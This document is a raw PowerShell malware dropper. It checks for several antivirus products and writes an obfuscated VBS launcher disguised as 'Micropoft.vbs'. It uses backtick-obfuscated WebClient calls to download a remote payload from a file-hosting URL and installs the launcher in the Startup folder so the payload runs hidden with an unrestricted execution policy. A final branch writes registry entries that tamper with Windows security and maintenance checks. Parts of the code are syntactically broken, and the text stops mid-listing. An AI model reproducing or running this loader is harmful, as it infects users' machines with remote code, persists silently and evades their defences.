
Function metay
{
if([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){

elseif([System.IO.File]::Exists("C:\Users\Public\Micropoft.vbs")){
Remove-Item -Path C:\Users\Public\Micropoft.vbs -Force
}
start-sleep -s 1


New-Item -Path C:\Users\Public\Micropoft.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\Micropoft.vbs -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s13' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s14' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s15' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H2 = "msi.ps1"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s16' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s17' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s18' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s19' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s20' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s21' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s22' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s23' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s24' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s25' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s26' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s27' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'hnv.Run RENAME,0' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s28' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s29' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s30' -Force

Get-Content -Path C:\Users\Public\Micropoft.vbs


$defender = 'C1@#%%$!@#blic\'.Replace("1@#%%$!@#",":\Users\Pu")
$SystemSettingsBroker = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
if((New-Object $SystemSettingsBroker)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://92c49223-b37f-4157-904d-daf4679f14d5.usrfiles.com/ugd/92c492_b65fd9e29d234e599ee68ce0e09f013e.txt', $defender + 'msi.ps1')){
}

Move-Item -Path "C:\Users\Public\Micropoft.vbs" -Destination "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs" -Force -Verbose

start-sleep -s 5

Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs"


}

elseif([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")){

elseif([System.IO.File]::Exists("C:\Users\Public\Micropoft.vbs")){
Remove-Item -Path C:\Users\Public\Micropoft.vbs -Force
}

start-sleep -s 10
New-Item -Path C:\Users\Public\Micropoft.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\Micropoft.vbs -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s13' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s14' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s15' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H2 = "msi.ps1"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s16' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s17' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s18' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s19' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s20' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s21' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s22' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s23' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s24' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s25' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s26' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s27' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'hnv.Run RENAME,0' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s28' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s29' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s30' -Force

Get-Content -Path C:\Users\Public\Micropoft.vbs


$defender = 'C1@#%%$!@#blic\'.Replace("1@#%%$!@#",":\Users\Pu")
$SystemSettingsBroker = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
if((New-Object $SystemSettingsBroker)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://92c49223-b37f-4157-904d-daf4679f14d5.usrfiles.com/ugd/92c492_b65fd9e29d234e599ee68ce0e09f013e.txt', $defender + 'msi.ps1')){
}

Move-Item -Path "C:\Users\Public\Micropoft.vbs" -Destination "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs" -Force -Verbose

start-sleep -s 5

Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs"



}
elseif([System.IO.File]::Exists("C:\Program Files\Common Files\McAfee\Platform\McUICnt.exe")){
elseif([System.IO.File]::Exists("C:\Users\Public\Micropoft.vbs")){
Remove-Item -Path C:\Users\Public\Micropoft.vbs -Force
}
start-sleep -s 1

New-Item -Path C:\Users\Public\Micropoft.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\Micropoft.vbs -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s13' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s14' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s15' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H2 = "msi.ps1"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s16' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s17' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s18' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s19' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s20' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s21' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s22' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s23' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s24' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s25' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s26' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s27' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'hnv.Run RENAME,0' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s28' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s29' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s30' -Force

Get-Content -Path C:\Users\Public\Micropoft.vbs
start-sleep -s 2


$defender = 'C1@#%%$!@#blic\'.Replace("1@#%%$!@#",":\Users\Pu")
if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://92c49223-b37f-4157-904d-daf4679f14d5.usrfiles.com/ugd/92c492_b65fd9e29d234e599ee68ce0e09f013e.txt', $defender + 'msi.ps1')){
}


Move-Item -Path "C:\Users\Public\Micropoft.vbs" -Destination "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs" -Force -Verbose

start-sleep -s 5

Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs"


}
elseif([System.IO.File]::Exists("C:\Program Files\Malwarebytes\Anti-Malware\mbamtray.exe")){

elseif([System.IO.File]::Exists("C:\Users\Public\Micropoft.vbs")){
Remove-Item -Path C:\Users\Public\Micropoft.vbs -Force
}
start-sleep -s 1

New-Item -Path C:\Users\Public\Micropoft.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\Micropoft.vbs -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s13' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s14' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s15' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H2 = "msi.ps1"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s16' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s17' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s18' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s19' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s20' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s21' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s22' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s23' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s24' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s25' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s26' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s27' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'hnv.Run RENAME,0' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s28' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s29' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s30' -Force

Get-Content -Path C:\Users\Public\Micropoft.vbs


start-sleep -s 3
$defender = 'C1@#%%$!@#blic\'.Replace("1@#%%$!@#",":\Users\Pu")
if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://92c49223-b37f-4157-904d-daf4679f14d5.usrfiles.com/ugd/92c492_b65fd9e29d234e599ee68ce0e09f013e.txt', $defender + 'msi.ps1')){
}


Move-Item -Path "C:\Users\Public\Micropoft.vbs" -Destination "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs" -Force -Verbose

start-sleep -s 5

Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs"

}

elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){

elseif([System.IO.File]::Exists("C:\Users\Public\Micropoft.vbs")){
Remove-Item -Path C:\Users\Public\Micropoft.vbs -Force
}
start-sleep -s 1

New-Item -Path C:\Users\Public\Micropoft.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\Micropoft.vbs -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s13' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s14' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s15' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H2 = "msi.ps1"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s16' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s17' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s18' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s19' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s20' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s21' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s22' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s23' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s24' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s25' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s26' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s27' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'hnv.Run RENAME,0' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s28' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s29' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s30' -Force

Get-Content -Path C:\Users\Public\Micropoft.vbs
start-sleep -s 10

$defender = 'C1@#%%$!@#blic\'.Replace("1@#%%$!@#",":\Users\Pu")
$SystemSettingsBroker = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
if((New-Object $SystemSettingsBroker)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://92c49223-b37f-4157-904d-daf4679f14d5.usrfiles.com/ugd/92c492_b65fd9e29d234e599ee68ce0e09f013e.txt', $defender + 'msi.ps1')){
}

Move-Item -Path "C:\Users\Public\Micropoft.vbs" -Destination "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs" -Force -Verbose

start-sleep -s 10

Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs"
}
else{
  
elseif([System.IO.File]::Exists("C:\Users\Public\Micropoft.vbs")){
Remove-Item -Path C:\Users\Public\Micropoft.vbs -Force
}
start-sleep -s 1
  
  New-Item -Path C:\Users\Public\meta.ps1 -ItemType File
Set-ItemProperty -Path C:\Users\Public\meta.ps1 -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'Windows Registry Editor Version 5.00' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{01979c6a-42fa-414c-b8aa-eee2c8202018}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,72,95,d4,76,21,15,a1,34,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'a9,81,1e,14,d6,bd,b3,91,0b,23,5c,74,61,4a,e3,08,58,8a,0d,46,c5,57,0d,b4,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,23,8f,17,7c,83,ae,0c,12,38,b9,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '93,b7,cf,05,50,6d,3e,e1,2b,ef,50,06,5c,85,61,04,6e,56,32,43,f0,72,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,71,47,f8,00,73,33,f6,8f,5a,e6,09,3d,96,1a,c9,f5,52,ae,c3,db,52,45,f4,ed,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '34,b3,2e,a4,30,00,ae,d3,b3,8f,f2,9d,c5,59,ac,b1,18,76,e1,e8,79,5b,bf,32,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,10,3f,ef,37,f4,d9,cb,74,f6,17,ab,cb,21,4f,31,99,d2,c9,14,be,cb,ce,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '19,75,40,8e,0f,bb,fd,1f,af,29,e9,e5,92,40,35,30,ac,01,11,f8,f2,06,9d,af,30,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'bd,7f,42,c3,d6,15,f3,d6,a2,65,17,e9,1f,2a,15,1e,ad' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{01979c6a-42fa-414c-b8aa-eee2c8202018}.check.101]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{088E8DFB-2464-4C21-BAD2-F0AA6DB5D4BC}.check.0]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:23,00,41,00,43,00,42,00,6c,00,6f,00,62,00,00,00,00,00,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,80,00,00,00,61,70,70,6c,26,ca,50,b3,15,dc,d0,01,01,00,00,00,7b,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,30,00,38,00,38,00,45,00,38,00,44,00,46,00,42,00,2d,00,32,00,34,00,36,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '34,00,2d,00,34,00,43,00,32,00,31,00,2d,00,42,00,41,00,44,00,32,00,2d,00,46,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,30,00,41,00,41,00,36,00,44,00,42,00,35,00,44,00,34,00,42,00,43,00,7d,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '2e,00,6e,00,6f,00,74,00,69,00,66,00,69,00,63,00,61,00,74,00,69,00,6f,00,6e,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,2e,00,31,00,00,00,73,68,3a,6e,61,6d,65,3e,40,73,68' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}.check.101]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{134EA407-755D-4A93-B8A6-F290CD155023}.check.8001]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,20,c1,9f,91,55,f3,43,a3,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '4e,1b,3b,9a,91,ec,fa,19,17,cb,45,43,f9,15,4b,ce,6a,c6,aa,b4,63,63,5f,36,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,84,22,14,42,cb,c8,72,1f,61,57,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '06,0c,34,d9,7e,b9,89,19,34,ab,b6,b9,ee,86,0e,5c,a1,6c,ae,14,08,48,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,32,da,85,ea,0a,b0,8a,69,49,c7,93,92,93,a6,1b,28,8c,a4,03,cf,56,94,b2,e1,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '7a,0b,c4,a0,b9,88,a3,01,d0,66,8c,c3,99,21,25,4f,3b,81,91,63,63,ff,97,6a,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,3d,91,7d,fa,a9,c4,ed,c3,90,08,fc,7d,7a,70,c9,64,34,2e,db,97,f7,e5,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '42,1f,cd,2d,57,69,1a,c8,90,4a,b8,81,43,15,aa,df,68,b9,42,5e,a6,92,99,84,9a,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '98,86,15,9b,95,77,37,96,6b,8e,bb,19,51,38,6e,1b,64' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{2374911B-B114-42FE-900D-54F95FEE92E5}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{34A3697E-0F10-4E48-AF3C-F869B5BABEBB}.check.9001]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,0b,e4,5e,f3,88,ad,02,35,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'd5,5b,30,29,41,db,5a,c2,a9,bd,d5,0c,94,ad,59,5f,56,88,d5,ab,7d,f2,7c,dc,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,ad,67,28,c5,a1,a4,b5,56,64,50,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '02,cd,48,2d,15,e6,ac,9d,40,92,e0,48,8f,95,95,07,06,43,cf,6a,93,04,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,d1,62,4d,e6,c3,1e,e8,76,bc,c0,56,c3,34,1e,17,28,93,4d,6e,d4,f2,46,87,bb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '9c,99,6f,50,e4,61,97,13,22,0e,1e,56,a7,b7,7b,c3,fd,c3,ee,6d,95,f7,93,59,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,b9,09,45,4c,3b,b7,42,15,0e,82,4f,f8,ac,14,8f,ad,ea,a0,3b,88,a0,56,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '15,ee,08,27,3e,33,fe,07,30,b0,c5,a6,80,82,f6,c1,a9,67,82,a2,ab,6b,a8,1c,fc,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'de,26,cd,d2,42,cd,34,38,70,44,a8,fb,37,18,28,9d,d4' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{34A3697E-0F10-4E48-AF3C-F869B5BABEBB}.check.9002]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{34A3697E-0F10-4E48-AF3C-F869B5BABEBB}.check.9003]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{34A3697E-0F10-4E48-AF3C-F869B5BABEBB}.check.9004]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{3FF37A1C-A68D-4D6E-8C9B-F79E8B16C482}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,83,fe,a4,6b,c9,b7,99,f4,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '40,9e,19,ab,4c,15,7f,0d,5e,37,67,b0,60,75,57,ad,3f,0a,c2,50,72,15,bc,d9,00,\' -Force
